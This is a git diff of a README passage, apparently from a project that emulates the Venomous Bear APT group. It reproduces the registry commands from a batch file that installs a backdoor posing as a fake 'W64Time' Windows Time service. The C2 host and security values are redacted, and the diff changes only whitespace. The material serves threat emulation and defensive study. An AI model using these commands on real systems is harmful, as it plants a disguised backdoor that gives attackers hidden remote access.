@@ -28,15 +28,15 @@ The attackers used a .bat file similar to the one below to install the backdoor 
 
 I wrote a .bat file identical to the one the attackers used to the one below to install the backdoor as a fake Microsoft Windows Time service.
 
-These commands add various configuration parameters for the W64Time service to the registry. 
-   
+These commands add various configuration parameters for the W64Time service to the registry.
+
     reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%SystemRoot%\system32\w64time.dll" /f
     reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v Hosts /t REG_SZ /d "REMOVED 5050" /f
     reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v Security /t REG_SZ /d "<REMOVED>" /f
     reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v TimeLong /t REG_DWORD /d 300000 /f
     reg add "HKLM\SYSTEM\CurrentControlSet\services\W64Time\Parameters" /v TimeShort /t REG_DWORD /d 5000 /f
 
-    
+
 ServiceDll: Specifies the DLL that implements the service.
 
 Hosts: Sets the hosts and port (values removed for security).
@@ -44,8 +44,8 @@ Hosts: Sets the hosts and port (values removed for security).
 Security: Configures security settings (value removed for security).
 
 TimeLong: A time-related setting.
- 
-TimeShort: Another time-related setting.  
+
+TimeShort: Another time-related setting.
 
 
 ![Screenshot from 2024-06-08 07-18-07](https://github.com/S3N4T0R-0X0/Venomous-Bear-APT/assets/121706460/a1d9236a-12fc-4008-a9a1-0eedb818d0c9)
